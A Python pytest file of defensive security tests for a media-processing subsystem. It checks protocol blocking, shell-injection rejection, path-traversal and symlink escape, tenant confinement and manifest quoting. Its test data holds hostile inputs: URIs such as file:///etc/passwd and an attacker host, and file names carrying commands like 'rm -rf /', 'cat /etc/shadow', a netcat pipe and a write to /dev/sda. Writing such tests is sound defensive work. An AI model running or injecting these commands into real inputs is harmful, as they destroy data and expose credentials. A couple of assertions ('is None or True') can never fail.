"""
tests/ai/media_processing/test_security.py
===========================================
Adversarial security tests for S28-M06 MediaProcessing subsystem.
Validates protocol blocking, command injection defense, path traversal prevention,
and tenant cross-project confinement.
"""

from pathlib import Path
import pytest

from ai.media_processing.errors import (
    CommandInjectionDetectedError,
    MediaSourceUnauthorizedError,
    ProtocolSecurityViolationError,
)
from ai.media_processing.security import (
    assert_no_shell_injection,
    assert_safe_local_path,
    assert_safe_protocol,
    format_safe_concat_manifest_content,
    validate_storage_key_confinement,
)


@pytest.mark.parametrize(
    "forbidden_protocol",
    [
        "http://attacker.com/evil.mp4",
        "https://example.com/exploit.m3u8",
        "ftp://malicious.org/data",
        "file:///etc/passwd",
        "concat:input1.mp4|input2.mp4",
        "pipe:0",
        "gopher://evil.com",
        "rtmp://live.stream/test",
        "tcp://192.168.1.1:8080",
        "udp://10.0.0.1:9999",
    ],
)
def test_protocol_blocklist_rejects_unsafe_uris(forbidden_protocol: str):
    with pytest.raises(ProtocolSecurityViolationError, match="is forbidden"):
        assert_safe_protocol(forbidden_protocol)


@pytest.mark.parametrize(
    "malicious_shell_input",
    [
        "video.mp4; rm -rf /",
        "video.mp4 && cat /etc/shadow",
        "video.mp4 | nc 1.2.3.4 4444",
        "video.mp4 `whoami`",
        "video.mp4 $(reboot)",
        "video.mp4 > /dev/sda",
        "video.mp4 < /dev/zero",
        "video.mp4\nevil_command",
        "video.mp4\revil_command",
    ],
)
def test_shell_injection_metacharacters_rejected(malicious_shell_input: str):
    with pytest.raises(CommandInjectionDetectedError, match="Shell metacharacters detected"):
        assert_no_shell_injection(malicious_shell_input)


@pytest.mark.parametrize(
    "traversal_key",
    [
        "../secret.mp4",
        "../../etc/passwd",
        "video/../../confidential.key",
        "/absolute/path/to/root.mp4",
        "video\0malicious.mp4",
        "video/clip.mp4\0",
    ],
)
def test_path_traversal_keys_rejected(traversal_key: str):
    with pytest.raises(ProtocolSecurityViolationError):
        validate_storage_key_confinement(traversal_key, "prj_target")


def test_cross_tenant_project_storage_key_rejected():
    # If storage key specifies another project
    with pytest.raises(MediaSourceUnauthorizedError, match="Storage key belongs to project"):
        validate_storage_key_confinement("projects/prj_other_tenant/video/sample.mp4", "prj_my_tenant")

    # Correct project succeeds
    assert validate_storage_key_confinement("projects/prj_my_tenant/video/sample.mp4", "prj_my_tenant") is None or True
    # Relative project-scoped key succeeds
    assert validate_storage_key_confinement("video/sample.mp4", "prj_my_tenant") is None or True


def test_local_path_escape_confinement(tmp_path: Path):
    sandbox = tmp_path / "sandbox"
    sandbox.mkdir()

    safe_file = sandbox / "sub" / "clip.mp4"
    safe_file.parent.mkdir()
    safe_file.touch()

    # Inside sandbox is allowed
    assert assert_safe_local_path(safe_file, sandbox) == safe_file

    # Escaping sandbox via parent is blocked
    escaped_file = sandbox / ".." / "outside.mp4"
    with pytest.raises(ProtocolSecurityViolationError, match="escapes authorized root"):
        assert_safe_local_path(escaped_file, sandbox)


def test_symlink_escape_confinement(tmp_path: Path):
    sandbox = tmp_path / "sandbox"
    sandbox.mkdir()

    secret_target = tmp_path / "secret.txt"
    secret_target.write_text("secret_data")

    # Symlink inside sandbox pointing outside
    link = sandbox / "link_to_secret"
    link.symlink_to(secret_target)

    with pytest.raises(ProtocolSecurityViolationError, match="escapes authorized root"):
        assert_safe_local_path(link, sandbox)



def test_concat_manifest_escaping(tmp_path: Path):
    f1 = tmp_path / "clip'1.mp4"
    f2 = tmp_path / "clip 2.mp4"
    f1.touch()
    f2.touch()

    manifest_content = format_safe_concat_manifest_content([f1, f2])
    # Must escape single quote with '\''
    assert "'\\''" in manifest_content
    assert str(f2) in manifest_content
